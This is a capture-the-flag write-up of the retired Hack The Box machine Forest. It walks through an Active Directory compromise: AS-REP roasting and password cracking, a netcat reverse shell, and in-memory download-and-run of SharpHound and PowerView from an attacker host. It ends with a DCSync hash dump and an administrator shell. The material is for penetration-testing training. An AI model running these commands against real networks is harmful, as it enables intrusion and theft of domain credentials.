---
layout: post
title: "Forest: Hack The Box Walkthrough"
subtitle: "Don't Miss the Forest for the Trees"
date: 2020-03-21 14:17:07 +0000
last_modified_at: 2020-03-21 14:17:07 +0000
category: Walkthrough
tags: ["Hack The Box", Forest, retired]
comments: true
image:
  feature: forest-htb-walkthrough.jpg
  credit: Free-Photos / Pixabay
  creditlink: https://pixabay.com/photos/forest-mist-nature-trees-mystic-931706/
---

This post documents the complete walkthrough of Forest, a retired vulnerable [VM][1] created by [egre55][2] and [mrb3n][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Forest is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.161 --rate=1000

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-10-16 00:00:28 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 54313/udp on 10.10.10.161                                 
Discovered open port 3268/tcp on 10.10.10.161                                  
Discovered open port 49671/tcp on 10.10.10.161                                 
Discovered open port 49697/tcp on 10.10.10.161                                 
Discovered open port 135/tcp on 10.10.10.161                                   
Discovered open port 47001/tcp on 10.10.10.161                                 
Discovered open port 139/tcp on 10.10.10.161                                   
Discovered open port 54070/udp on 10.10.10.161                                 
Discovered open port 49669/tcp on 10.10.10.161                                 
Discovered open port 49912/tcp on 10.10.10.161                                 
Discovered open port 5985/tcp on 10.10.10.161                                  
Discovered open port 464/tcp on 10.10.10.161                                   
Discovered open port 3269/tcp on 10.10.10.161                                  
Discovered open port 53/tcp on 10.10.10.161                                    
Discovered open port 9389/tcp on 10.10.10.161                                  
Discovered open port 389/tcp on 10.10.10.161                                   
Discovered open port 49666/tcp on 10.10.10.161                                 
Discovered open port 636/tcp on 10.10.10.161                                   
Discovered open port 49678/tcp on 10.10.10.161                                 
Discovered open port 55579/udp on 10.10.10.161                                 
Discovered open port 88/tcp on 10.10.10.161                                    
Discovered open port 49667/tcp on 10.10.10.161                                 
Discovered open port 49664/tcp on 10.10.10.161                                 
Discovered open port 593/tcp on 10.10.10.161                                   
Discovered open port 49670/tcp on 10.10.10.161                                 
Discovered open port 49665/tcp on 10.10.10.161                                 
Discovered open port 55249/udp on 10.10.10.161                                 
Discovered open port 445/tcp on 10.10.10.161
```

Whoa. That's a lot of open ports. Let's do one better with nmap scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -A --reason 10.10.10.161 -oN nmap.txt
...
PORT     STATE SERVICE      REASON          VERSION
53/tcp   open  domain?      syn-ack ttl 127
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2019-10-16 00:18:39Z)
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?    syn-ack ttl 127
593/tcp  open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped   syn-ack ttl 127
3268/tcp open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped   syn-ack ttl 127
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       syn-ack ttl 127 .NET Message Framing
...
Host script results:
|_clock-skew: mean: 2h26m48s, deviation: 4h02m31s, median: 6m46s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2019-10-15T17:21:08-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2019-10-16T00:21:09
|_  start_date: 2019-10-15T22:15:23
```

Interesting. An Active Directory forest as the name suggests with one domain HTB? Let's see what we can find with good ol' `rpcclient`.

```
# rpcclient 10.10.10.161 -U%
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Hmm. What have we here? A service account? Service accounts are known to have poor password hygiene and they don't change regularly. :wink:

Let's give it a shot to `GetNPUsers.py`, which attempts to list and get TGTs for users that have the property "Do not require Kerberos preauthentication" set. Seems like something a service account would do.

```
# python GetNPUsers.py -format john -no-pass htb/svc-alfresco
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$svc-alfresco@HTB:0f6fe997e988a2e397f5df307b1373aa$5e00024090668f3ae67aa512ed9531838598a205c86f0e30096eefb998e1f5d077a43d5b89decebe9943d2e2cd2a75f9fac0a06814f75a1f4434c9ad9746fc0235cb545e7a12caf22664ca97eef6b976c607511e6fa5ecb5c9ab65aa42f7672bcc6682571770ddf82b9d2275d01c8cdd326e41e5bc44c5cb3b306bc0bef6701596319b2a85a0ddb58738aae70460488933ceb99b6da8049a6ffd5aeac76c52352df0385f11ce2744b22249922a57929e0ade3aabf174f488e656d8776fd1b2eb27cdc3827e0c5a3e9d01617515047f7f24fcf9a1bcddca112bdae9574a37f89f
```

Awesome. Time to fire up John the Ripper.

```
# /opt/john/john -w:/usr/share/wordlists/rockyou.txt alfresco.hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$svc-alfresco@HTB)
1g 0:00:00:04 DONE (2019-10-17 12:19) 0.2267g/s 926476p/s 926476c/s 926476C/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Low-Privilege Shell

Armed with the password of `svc-alfresco`, we can attempt PowerShell Remoting through WinRM with a very nifty tool—[evil-winrm](https://github.com/Hackplayers/evil-winrm).

<a class="image-popup">
![248ee2c9.png](/assets/images/posts/forest-htb-walkthrough/248ee2c9.png)
</a>

Bam. There you have it. The file `user.txt` is at `svc-alfresco`'s desktop.

<a class="image-popup">
![e0c63812.png](/assets/images/posts/forest-htb-walkthrough/e0c63812.png)
</a>

Once we have this "shell", we can transfer `nc.exe` from Kali Linux for a more traditional shell.

```
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata> iwr http://10.10.14.192/nc.exe -outf .\cute.exe
*Evil-WinRM* PS C:\Users\svc-alfresco\appdata> start-process -filepath .\cute.exe -argumentlist "10.10.14.192 1234 -e cmd.exe" -nonewwindow
```

<a class="image-popup">
![d6903f9b.png](/assets/images/posts/forest-htb-walkthrough/d6903f9b.png)
</a>

## Privilege Escalation

During enumeration of `svc-alfresco`'s account, I noticed that the account has WriteDacl permissions. This is evident from the BloodHound collection.

```
PS C:\Users\svc-alfresco\appdata> iex (new-object net.webclient).downloadstring('http://10.10.14.192/SharpHound.ps1')
PS C:\Users\svc-alfresco\appdata> Invoke-Bloodhound -CollectionMethod All -LDAPPort 389 -LDAPUser svc-alfresco -LDAPPass s3rvice
```

I'll leave it as an exercise how to transfer the zipped JSON files over to your attacking machine for analysis.

<a class="image-popup">
![c39ad897.png](/assets/images/posts/forest-htb-walkthrough/c39ad897.png)
</a>

Did you see it? Not only that, `svc-alfresco` has the power to create domain users as well!

<a class="image-popup">
![56d7c428.png](/assets/images/posts/forest-htb-walkthrough/56d7c428.png)
</a>


With the WriteDacl permission, we can grant the newly created user with DCSync rights to dump the NTLM hashes. But first, we need enter into the **Exchange Trusted Subsystem** group.

```
PS C:\Users\svc-alfresco\appdata> Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members svc-alfresco
```

This is important. We need to relogin to `svc-alfresco` for the group membership to take effect.

<a class="image-popup">
![b11bf806.png](/assets/images/posts/forest-htb-walkthrough/b11bf806.png)
</a>

Next up, load up PowerView to grant `austin` his DCSync rights!

```
PS C:\Users\svc-alfresco\appdata> iex (new-object net.webclient).downloadstring('http://10.10.14.192/pv.ps1')
PS C:\Users\svc-alfresco\appdata> Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity austin -Rights DCSync
```

With that, we should be able to dump the secrets with Impacket's `secretdump.py`.

<a class="image-popup">
![5f33bf31.png](/assets/images/posts/forest-htb-walkthrough/5f33bf31.png)
</a>

Armed with the `administrator`'s hash, we can use Impacket's `smbexec.py` to get a privileged shell.

<a class="image-popup">
![72153db6.png](/assets/images/posts/forest-htb-walkthrough/72153db6.png)
</a>

Getting `root.txt` is trivial.

<a class="image-popup">
![85476e0a.png](/assets/images/posts/forest-htb-walkthrough/85476e0a.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/212
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu/home/users/profile/2984
[4]: https://www.hackthebox.eu/
